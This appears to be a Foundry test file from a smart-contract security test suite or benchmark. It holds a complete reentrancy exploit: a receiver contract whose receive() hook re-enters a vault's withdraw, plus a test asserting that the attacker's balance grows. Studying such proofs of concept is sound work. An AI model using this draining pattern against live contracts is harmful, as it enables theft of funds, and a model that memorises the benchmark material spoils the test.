// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/b0b81eaa-03b6-4c77-bc21-932ac70651d1_ReentrancyVault.sol";

contract ReentrancyReceiver {
    ReentrancyVault private immutable target;
    uint256 private immutable amount;

    constructor(ReentrancyVault target_) {
        target = target_;
        amount = 1 ether;
    }

    receive() external payable {
        if (address(target).balance >= amount) {
            target.withdraw(amount);
        }
    }

    function attack() external payable {
        require(msg.value == amount, "incorrect seed");
        target.deposit{value: amount}();
        target.withdraw(amount);
    }
}

contract PocTest is BaseTestWithBalanceLog {
    ReentrancyVault target;
    ReentrancyReceiver receiver;
    address attacker = 0xBAD;

    function setUp() public {
        target = new ReentrancyVault();
        receiver = new ReentrancyReceiver(target);
        vm.deal(attacker, 10 ether);
        vm.deal(address(target), 10 ether);
    }

    function testExploit() public balanceLog {
        uint256 initialBalance;
        uint256 finalBalance;

        // Get the initial balance of the receiver
        initialBalance = address(receiver).balance;

        // Attack the target contract
        vm.prank(attacker);
        receiver.attack{value: 1 ether}();

        // Get the final balance of the receiver
        finalBalance = address(receiver).balance;

        // Assert that the receiver's balance has increased
        assertGt(finalBalance, initialBalance);
    }
}